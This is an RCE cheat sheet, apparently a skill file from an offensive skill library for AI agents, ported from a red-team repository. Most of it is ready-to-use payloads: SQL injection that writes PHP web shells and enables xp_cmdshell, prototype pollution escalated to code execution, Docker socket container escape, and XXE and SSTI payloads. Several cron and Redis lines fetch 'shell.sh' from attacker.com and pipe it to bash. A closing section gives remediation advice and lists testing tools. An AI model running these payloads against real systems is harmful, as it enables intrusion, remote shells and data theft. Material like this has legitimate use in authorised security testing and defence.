### Prototype Pollution → RCE (Node.js)

**Pollute Object prototype:**

```javascript
// Via JSON
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// Via query parameters
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```

**Escalate to RCE:**

```javascript
// Pollute child_process options
{
  "__proto__": {
    "shell": "/bin/sh",
    "argv0": "console.log(require('child_process').execSync('whoami').toString())//"
  }
}

// Pollute via NODE_OPTIONS
{"__proto__": {"NODE_OPTIONS": "--require /tmp/malicious.js"}}

// CVE-2022-21824 - Prototype pollution in VM module
```

### FFmpeg / ExifTool Exploits

**FFmpeg SSRF (CVE-2016-1897, CVE-2016-1898):**

```
# Playlist SSRF
concat:http://attacker.com/playlist|file:///etc/passwd

# HLS SSRF
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://internal.server/admin
```

**ExifTool RCE (CVE-2021-22204):**

```bash
# Create malicious image with DjVu exploit
exiftool -config exploit.config '-HasselbladExif<=exploit.jpg' malicious.jpg
```

### SQL Injection → RCE

**MySQL:**

```sql
-- Write web shell
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Read file
LOAD_FILE('/etc/passwd');

-- UDF exploitation
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('whoami');
```

**PostgreSQL:**

```sql
-- COPY TO PROGRAM (9.3+)
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/beacon';

-- Large Object + lo_export
SELECT lo_create(-1);
INSERT INTO pg_largeobject VALUES (-1, 0, decode('<?php system($_GET["c"]); ?>', 'base64'));
SELECT lo_export(-1, '/var/www/html/shell.php');
```

**MSSQL:**

```sql
-- xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- OLE Automation
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami';
```

### Container Escape → RCE

**Docker Socket Exposure:**

```bash
# If /var/run/docker.sock is mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
```

**Privileged Container:**

```bash
# From privileged container
mkdir /tmp/exploit
mount /dev/sda1 /tmp/exploit
chroot /tmp/exploit sh
```

**Kernel Exploits:**

- Dirty COW (CVE-2016-5195)
- DirtyPipe (CVE-2022-0847)
- DirtyCred (CVE-2022-2588)

## Chaining and Escalation

### 1. Path Traversal → RCE

```bash
# Overwrite SSH authorized_keys
PUT /upload?path=../../.ssh/authorized_keys

# Overwrite cron job
PUT /upload?path=../../etc/cron.d/backdoor
Content: * * * * * root curl http://attacker.com/shell.sh | bash

# Overwrite bash profile
PUT /upload?path=../../.bashrc

# Overwrite PHP auto-prepend
PUT /upload?path=../../.user.ini
Content: auto_prepend_file=/tmp/shell.php
```

### 2. SSRF → RCE

```bash
# SSRF to cloud metadata → IAM creds
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# SSRF to internal admin → RCE
http://internal:8080/admin/exec?cmd=whoami

# SSRF to Redis → cron job
http://localhost:6379
CONFIG SET dir /etc/cron.d/
CONFIG SET dbfilename root
SET 1 "* * * * * root curl http://attacker.com/shell.sh | bash"
SAVE
```

### 3. XXE → RCE

```xml
# XXE + PHP expect wrapper
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://whoami">
]>
<root>&xxe;</root>

# XXE + JAR protocol (Java)
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "jar:http://attacker.com/malicious.jar!/payload.class">
]>
```

### 4. SSTI → File Write → RCE

```python
# Jinja2 write web shell
{{''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET["c"]); ?>')}}
```

## Real-World CVEs and Cases

### Critical RCE Vulnerabilities

1. **CVE-2021-44228 - Log4Shell (Apache Log4j)**:
   - JNDI injection in logging library
   - Affected: Minecraft, VMware, Cisco, countless others
   - Impact: Unauthenticated RCE on millions of systems

2. **CVE-2022-22965 - Spring4Shell (Spring Framework)**:
   - Class loader manipulation via property binding
   - Impact: RCE on Spring MVC applications

3. **CVE-2021-3129 - Laravel Debug Mode RCE**:
   - Ignition debug page deserialization
   - Impact: Unauthenticated RCE on Laravel apps with debug enabled

4. **CVE-2019-0193 - Apache Solr RCE**:
   - Velocity template injection
   - Impact: Unauthenticated RCE on Solr instances

5. **CVE-2017-5638 - Apache Struts2 RCE**:
   - OGNL injection via Content-Type header
   - Impact: Led to Equifax breach affecting 147M people

6. **CVE-2020-1938 - Ghostcat (Apache Tomcat)**:
   - AJP protocol file read/inclusion
   - Impact: RCE via arbitrary file write

7. **CVE-2022-26134 - Confluence RCE**:
   - OGNL injection in Confluence Server/Data Center
   - Impact: Unauthenticated RCE

8. **CVE-2018-1002200 - Kubernetes Arbitrary File Overwrite (Zip Slip)**:
   - Path traversal in tar/zip extraction
   - Impact: Container escape via kubectl cp

9. **CVE-2016-3714 - ImageTragick (ImageMagick)**:
   - Command injection via image processing
   - Impact: RCE on image upload features

10. **CVE-2021-22204 - ExifTool RCE**:
    - DjVu metadata command injection
    - Impact: RCE via image metadata parsing

### Impact Categories

- **Critical**: Unauthenticated RCE on internet-facing services
- **High**: Authenticated RCE or unauthenticated RCE requiring interaction
- **Medium**: RCE requiring specific configuration or low-privilege authentication
- **Low**: RCE requiring admin access or highly specific conditions

## Remediation Recommendations

Avoid inserting user input into code that gets evaluated. Also treat user uploaded files as untrusted, and avoid including file based on user input.

### Defensive Checklist

- **Eliminate Dangerous Functions**: Remove `eval`, `exec`, `Function`, `subprocess.shell=True`, `Runtime.exec()` where possible
- **Parameterized Execution**: Use parameterized/array-based process execution (`shell=False`); escape+allowlist arguments
- **Template Engine Hardening**: Disable dangerous functions/tags; enable sandbox mode; don't accept user templates
- **Strict Upload Validation**:
  - Enforce content-type AND extension checks
  - Verify via magic bytes (file signature)
  - Re-encode/process files (strip metadata with exiftool -all=)
  - Store uploads outside web root
- **Sandbox File Processing**:
  - Process uploads in isolated containers/VMs
  - Use seccomp, AppArmor, SELinux restrictions
  - Run as non-root with minimal permissions
  - No network access during processing
  - Delay publish until validation completes
- **Safe Deserialization**:
  - Prefer JSON/XML with strict schemas
  - Sign and verify serialized data
  - Avoid `pickle`, `marshal`, native object graphs
  - Use allowlists for permitted classes
- **Dependency Management**:
  - Keep libraries updated (ImageMagick, ExifTool, FFmpeg, Log4j, etc.)
  - Pin versions and audit dependencies
  - Subscribe to security advisories
  - Use tools: `npm audit`, `pip-audit`, `OWASP Dependency-Check`
- **Network Segmentation**:
  - Implement egress filtering to prevent OAST callbacks
  - Restrict outbound connections from app servers
  - Monitor DNS queries for suspicious patterns
- **WAF/RASP**:
  - Deploy Web Application Firewall with RCE signatures
  - Consider Runtime Application Self-Protection (RASP)
  - Log and alert on suspicious payloads
- **Log4Shell Specific**:
  - Update to Log4j 2.17.1+
  - Set `log4j2.formatMsgNoLookups=true`
  - Remove JndiLookup class from classpath
  - Monitor for obfuscated JNDI patterns

### Testing Tools

- **SSTI**: `tplmap`, `SSTImap`
- **Deserialization**: `ysoserial`, `ysoserial.net`, `marshalsec`
- **Command Injection**: Burp Intruder, `commix`
- **General**: Burp ActiveScan, `nuclei` templates, `jaeles` signatures
- **OAST**: Burp Collaborator, Interactsh, canarytokens.org

---

## Attribution

Ported from [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
(`Skills/*/offensive-rce`), Apache-2.0 licensed. Methodology preserved; Claude-specific
mechanics rewritten for OSA's builtin tools.

Part of the offensive skill library — see also `penetration-testing` for the
full-engagement workflow and `offensive-osint` / `osint-methodology` for
reconnaissance methodology.

